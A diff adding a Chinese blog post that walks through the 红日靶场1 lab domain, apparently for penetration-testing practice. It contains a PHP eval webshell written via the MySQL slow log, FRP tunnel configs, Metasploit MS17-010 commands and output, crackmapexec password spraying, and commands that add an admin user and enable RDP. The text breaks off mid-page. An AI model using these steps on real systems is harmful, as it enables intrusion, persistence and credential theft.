@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="红日靶场1 难度：middle">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场1">
+<meta property="og:url" content="https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/index.html">
+<meta property="og:site_name" content="清风的博客">
+<meta property="og:description" content="红日靶场1 难度：middle">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210205045-r9afnyr.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202018-aqiysd9.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202958-622rrai.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202104-lt6l3k5.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202414-kyqtf68.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204508-02rg8ia.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204336-3dqvdcp.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204411-y31xc6s.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210205414-id1wnm7.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210211420-j24rvy9.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211184811-8rqyuk2.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211190543-szga4nw.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194755-kb1rv6b.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194800-1r6iydb.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194649-jvut2cj.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211191356-e02wn7b.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211191046-iybdkoz.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212063112-bg5ebnx.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092802-yv0emen.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092814-ttcpke3.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212092831-zloyyws.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093432-hl4qs4y.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093518-5k8rq96.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093530-90gyeya.png">
+<meta property="article:published_time" content="2023-12-12T07:09:37.000Z">
+<meta property="article:modified_time" content="2023-12-12T07:10:06.973Z">
+<meta property="article:author" content="清风">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210205045-r9afnyr.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>红日靶场1</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/11/24/DASCTF%20X%20CBCTF%202023/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&text=红日靶场1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&is_video=false&description=红日靶场1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=红日靶场1&body=Check out this article: https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&title=红日靶场1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&name=红日靶场1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/&t=红日靶场1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1"><span class="toc-number">1.</span> <span class="toc-text">红日靶场1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">靶场配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell%E5%A4%96%E5%9B%B4%E6%9C%BA"><span class="toc-number">1.3.</span> <span class="toc-text">getshell外围机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS17010%E5%9F%9F%E6%8E%A7%E6%89%93%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">MS17010域控打法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%9F%9F%E6%8E%A7%E6%89%93%E6%B3%95"><span class="toc-number">1.6.</span> <span class="toc-text">计划任务域控打法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A2%B0%E6%92%9E"><span class="toc-number">1.6.1.</span> <span class="toc-text">密码碰撞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC%E6%A8%AA%E5%90%91"><span class="toc-number">1.6.2.</span> <span class="toc-text">IPC横向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAIPC%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">创建IPC连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">创建计划任务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH%E5%9F%9F%E6%8E%A7%E6%89%93%E6%B3%95"><span class="toc-number">1.7.</span> <span class="toc-text">PTH域控打法</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        红日靶场1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">清风</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-12T07:09:37.000Z" class="dt-published" itemprop="datePublished">2023-12-12</time>
+        
+        (Updated: <time datetime="2023-12-12T07:10:06.973Z" class="dt-updated" itemprop="dateModified">2023-12-12</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="红日靶场1"><a href="#红日靶场1" class="headerlink" title="红日靶场1"></a>红日靶场1</h1><h2 id="靶场配置"><a href="#靶场配置" class="headerlink" title="靶场配置"></a>靶场配置</h2><p>红日1共有三台主机，配置如下：</p>
+<p>​​​​​​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210205045-r9afnyr.png" alt="image">​​​​​​</p>
+<p>‍</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现外围主机是禁Pin的，使用fscan扫描需要带上np参数</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202018-aqiysd9.png" alt="image">​</p>
+<p>有3306和80服务，扫一下目录</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202958-622rrai.png" alt="image">​</p>
+<p>发现一个phpMyadmin，访问看看</p>
+<h2 id="getshell外围机"><a href="#getshell外围机" class="headerlink" title="getshell外围机"></a>getshell外围机</h2><p>弱口令root&#x2F;root可以进后台：</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202104-lt6l3k5.png" alt="image">​</p>
+<p>这里就直接利用慢日志写shell了</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%slow_query_log%'</span><span class="token punctuation">;</span>  
+<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> 开启慢查询
+<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log_file<span class="token operator">=</span><span class="token string">'C:\\phpStudy\\WWW\\shell.php'</span><span class="token punctuation">;</span> 设置写shell路径
+<span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST[1]);?>'</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> sleep时间要超过最大限制才生效
+</code></pre>
+<p>之后直接利用蚁剑连接即可：</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210202414-kyqtf68.png" alt="image">​</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>ipconfig探测一下内网信息：</p>
+<pre class=" language-xml"><code class="language-xml">C:\phpStudy\WWW> ipconfig
+Windows IP 配置
+以太网适配器 本地连接 5:
+   连接特定的 DNS 后缀 . . . . . . . : localdomain
+   本地链接 IPv6 地址. . . . . . . . : fe80::9534:7b0c:21aa:e840%26
+   IPv4 地址 . . . . . . . . . . . . : 192.168.120.131
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 192.168.120.2
+以太网适配器 本地连接 3:
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+以太网适配器 本地连接 2:
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+以太网适配器 Bluetooth 网络连接:
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+以太网适配器 本地连接:
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::b022:79c6:8704:ef83%11
+   IPv4 地址 . . . . . . . . . . . . : 192.168.52.143
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 192.168.52.2
+</code></pre>
+<p>看一下杀软：</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204508-02rg8ia.png" alt="image">​</p>
+<p>发现这台机器没有杀软</p>
+<p>直接上fscan开扫：</p>
+<pre class=" language-xml"><code class="language-xml">start infoscan
+(icmp) Target 192.168.52.143  is alive
+(icmp) Target 192.168.52.138  is alive
+(icmp) Target 192.168.52.141  is alive
+[*] Icmp alive hosts len is: 3
+192.168.52.141:445 open
+192.168.52.138:445 open
+192.168.52.141:7002 open
+192.168.52.138:88 open
+192.168.52.141:7001 open
+192.168.52.143:3306 open
+192.168.52.143:445 open
+192.168.52.141:139 open
+192.168.52.138:139 open
+192.168.52.141:135 open
+192.168.52.143:139 open
+192.168.52.138:135 open
+192.168.52.143:135 open
+192.168.52.138:80 open
+192.168.52.143:80 open
+192.168.52.141:21 open
+192.168.52.141:8099 open
+192.168.52.141:8098 open
+[*] alive ports len is: 18
+start vulscan
+[*] NetInfo:
+[*]192.168.52.143
+   [->]stu1
+   [->]192.168.52.143
+   [->]192.168.120.131
+   [->]169.254.129.186
+[+] 192.168.52.143	MS17-010	(Windows 7 Professional 7601 Service Pack 1)
+[*] NetInfo:
+[*]192.168.52.138
+   [->]owa
+   [->]192.168.52.138
+[*] NetBios: 192.168.52.143  stu1.god.org                        Windows 7 Professional 7601 Service Pack 1 
+[+] 192.168.52.138	MS17-010	(Windows Server 2008 R2 Datacenter 7601 Service Pack 1)
+[*] NetBios: 192.168.52.138  [+]DC owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1 
+[*] NetInfo:
+[*]192.168.52.141
+   [->]root-tvi862ubeh
+   [->]192.168.52.141
+[*] WebTitle: http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor
+[*] WebTitle: http://192.168.52.138     code:200 len:689    title:IIS7
+[+] 192.168.52.141	MS17-010	(Windows Server 2003 3790)
+[*] WebTitle: http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel
+[+] ftp://192.168.52.141:21:anonymous 
+[*] WebTitle: http://192.168.52.143     code:200 len:14749  title:phpStudy 探针 2014
+</code></pre>
+<p>额，有点无语住了，怎么全是MS17-010，那还有啥意义</p>
+<p>算了，先打打试试看吧</p>
+<p>挂个FRP代理(<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">Releases · fatedier&#x2F;frp (github.com)</a>)，Server：(frps.ini)</p>
+<pre class=" language-xml"><code class="language-xml">[common]
+## 一、服务器的基本配置部分
+## 7000 是FRP服务端口，可以改
+bind_port = 7000
+## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。
+dashboard_user = admin
+dashboard_pwd = frpadmin@2022
+## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆
+dashboard_port = 25500
+## 服务器和客户机之间的心跳连接
+heartbeat_timeout = 30
+#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求
+token=frpToken@admin2022
+</code></pre>
+<p>这个本地执行</p>
+<p>​<code>frps.exe -c frps.ini</code>​</p>
+<p>Client:(frpc.ini)</p>
+<pre class=" language-xml"><code class="language-xml">[common]
+server_addr = 192.168.251.1
+server_port = 7000
+token = frpToken@admin2022
+
+
+[proxy]
+type = tcp
+plugin = socks5
+remote_port = 25599
+</code></pre>
+<p>这个传到Win7执行：</p>
+<p>​<code>frpc.exe -c frpc.ini</code>​</p>
+<h2 id="MS17010域控打法"><a href="#MS17010域控打法" class="headerlink" title="MS17010域控打法"></a>MS17010域控打法</h2><pre class=" language-xml"><code class="language-xml">use auxiliary/admin/smb/ms17_010_command
+set rhosts 192.168.52.138 192.168.52.141
+set command tasklist
+show options
+run
+</code></pre>
+<p>MS17-010直接打穿了：</p>
+<pre class=" language-xml"><code class="language-xml">msf6 auxiliary(admin/smb/ms17_010_command) > run
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  192.168.120.1:25599  ...  192.168.52.138:445  ...  OK
+
+[*] 192.168.52.138:445    - Target OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1
+[*] 192.168.52.138:445    - Built a write-what-where primitive...
+[+] 192.168.52.138:445    - Overwrite complete... SYSTEM session obtained!
+[+] 192.168.52.138:445    - Service start timed out, OK if running a command or non-service executable...
+[*] 192.168.52.138:445    - Getting the command output...
+[*] 192.168.52.138:445    - Executing cleanup...
+[+] 192.168.52.138:445    - Cleanup was successful
+[+] 192.168.52.138:445    - Command completed successfully!
+[*] 192.168.52.138:445    - Output for "ipconfig":
+
+
+Windows IP ����
+
+
+���������� ��������:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   �������� IPv6 ��. . . . . . . . : fe80::b84d:95ca:b6b3:6ddf%11
+   IPv4 �� . . . . . . . . . . . . : 192.168.52.138
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   Ĭ������. . . . . . . . . . . . . : 192.168.52.2
+
+���������� isatap.{D7C92CB6-1939-46AC-85CE-50401CEC5056}:
+
+   ý��״  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . : 
+
+
+[*] Scanned 1 of 2 hosts (50% complete)
+[proxychains] Strict chain  ...  192.168.120.1:25599  ...  192.168.52.141:445  ...  OK
+[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790
+[*] 192.168.52.141:445    - Filling barrel with fish... done
+[*] 192.168.52.141:445    - <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>----------------</span> <span class="token attr-name">|</span> <span class="token attr-name">Entering</span> <span class="token attr-name">Danger</span> <span class="token attr-name">Zone</span> <span class="token attr-name">|</span> <span class="token attr-name">----------------</span><span class="token punctuation">></span></span>
+[*] 192.168.52.141:445    -     [*] Preparing dynamite...
+[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss
+[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!
+[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!
+[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel
+[*] 192.168.52.141:445    - <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>----------------</span> <span class="token attr-name">|</span> <span class="token attr-name">Leaving</span> <span class="token attr-name">Danger</span> <span class="token attr-name">Zone</span> <span class="token attr-name">|</span> <span class="token attr-name">----------------</span><span class="token punctuation">></span></span>
+[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x8d463d60
+[*] 192.168.52.141:445    - Built a write-what-where primitive...
+[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!
+[+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...
+[*] 192.168.52.141:445    - Getting the command output...
+[*] 192.168.52.141:445    - Executing cleanup...
+[+] 192.168.52.141:445    - Cleanup was successful
+[+] 192.168.52.141:445    - Command completed successfully!
+[*] 192.168.52.141:445    - Output for "ipconfig":
+
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IP Address. . . . . . . . . . . . : 192.168.52.141
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.52.2
+
+
+[*] Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+</code></pre>
+<h2 id="计划任务域控打法"><a href="#计划任务域控打法" class="headerlink" title="计划任务域控打法"></a>计划任务域控打法</h2><p>这里我们走CS去看看，先上线</p>
+<p>Listen配置如图：</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204336-3dqvdcp.png" alt="image">​</p>
+<p>再配置一个exe木马：</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210204411-y31xc6s.png" alt="image">​</p>
+<p>因为没有杀软限制，这里不用做免杀</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210205414-id1wnm7.png" alt="image">​</p>
+<p>上线之后我们考虑如何做横向移动</p>
+<p>Win7可以考虑抓密码：</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231210211420-j24rvy9.png" alt="image">​</p>
+<p>这里可以看到是<code>qwe123!@#</code>​</p>
+<h3 id="密码碰撞"><a href="#密码碰撞" class="headerlink" title="密码碰撞"></a>密码碰撞</h3><p>利用<code>qwe123!@#</code>​做密码碰撞</p>
+<pre class=" language-shell"><code class="language-shell">proxychains -q crackmapexec smb 192.168.52.1/24 -u 'administrator' -p 'qwe123!@#
+</code></pre>
+<p>因为我这里设置问题，三台都设置了一样的，所以三台都通了</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211184811-8rqyuk2.png" alt="image">​</p>
+<p>接下来我们就使用IPC进行横向了</p>
+<h3 id="IPC横向"><a href="#IPC横向" class="headerlink" title="IPC横向"></a>IPC横向</h3><p>IPC横向思路：</p>
+<p>定时任务at，计划任务schtasks，创建.bat执行命令或者.exe上线(at命令在2008R2之后启用了，还是用schtasks好点)</p>
+<p>‍</p>
+<p>计划任务schtasks演示</p>
+<p>这里有两种做法，先建立IPC连接然后创建计划任务或者直接创建计划任务</p>
+<h4 id="创建IPC连接"><a href="#创建IPC连接" class="headerlink" title="创建IPC连接"></a><strong>创建IPC连接</strong></h4><p><strong>工作组环境:</strong></p>
+<pre><code>net use \\192.168.xx.xx\ipc$ &quot;password&quot; /user:&quot;administrator&quot;
+</code></pre>
+<p><strong>域内环境:</strong></p>
+<pre><code>net use \\192.168.xx.xx\ipc$ &quot;password&quot; /user:xxx.com\&quot;administrator&quot;
+</code></pre>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211190543-szga4nw.png" alt="image">​</p>
+<p>建立成功可以使用<code>net use</code>​查看连接情况</p>
+<p>接下来我们需要使用net time查看目标主机的时间，因为目标主机的时间不一定是走的北京时间，有时候是根本没设置的乱序时间，以便后面我们创建定时任务的时候设定开始时间，不过这里使用计划任务可以忽略这一步</p>
+<p>因为外围机器Win7开着防火墙，无法做代理转发到CS，所以我们添加用户，上Win7的桌面把防火墙关了</p>
+<pre class=" language-shell"><code class="language-shell">net user qingfeng qwer1234! /add
+net localgroup administrators qingfeng /add
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</code></pre>
+<p>这里的RDP也只允许本地登录，所以我们挂个代理进去连接</p>
+<p>先挂上FRP上面写过这里不赘述了</p>
+<p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194755-kb1rv6b.png" alt="image"><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231211194800-1r6iydb.png" alt="image">​</p>
+<p>添加远程桌面代理后直接连接，关掉防火墙</p>
